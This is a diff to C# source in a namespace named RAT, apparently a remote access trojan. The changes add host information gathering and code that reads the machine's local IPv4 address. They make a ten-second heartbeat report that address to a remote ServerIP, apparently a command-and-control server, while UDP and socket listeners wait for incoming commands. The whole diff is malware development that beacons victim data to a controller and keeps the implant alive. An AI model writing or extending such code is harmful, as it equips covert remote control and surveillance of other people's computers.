@@ -1,11 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Management;
+using System.Text;
 
 namespace RAT
 {
@@ -13,18 +12,26 @@ namespace RAT
     {
         public static Int32 port;
         public static String ServerIP;
+        public static String LocalIP;
+ 
         public static void main()
         {
             UDPListener listener = new UDPListener();
+            LocalIP = GetLocalIPAddress();
             listener.startR();
             Task.Factory.StartNew(() => HeartBeat());
+            InfoGather.gather();
+            while (true)
+            {
+                Thread.Sleep(1000);
+            }
         }
         public static void HeartBeat()
         {
             Task.Factory.StartNew(() => AsynchronousSocketListener.StartListening());
             while (true)
             {
-                Send("<HEARTBEAT> 192.168.0.45");
+                Send("<HEARTBEAT> "+LocalIP);
                 Thread.Sleep(10000);
             }
         }
@@ -40,6 +47,18 @@ namespace RAT
                 }
             }
         }
+        public static string GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            throw new Exception("No network adapters with an IPv4 address in the system!");
+        }
         public static bool CheckConnection()
         {
             using (TcpClient tcpClient = new TcpClient())
@@ -53,7 +72,7 @@ namespace RAT
                 catch (Exception)
                 {
                     Console.WriteLine("Cannot Connect");
-                    Thread.Sleep(200);
+                    Thread.Sleep(2000);
                     return false;
                 }
             }
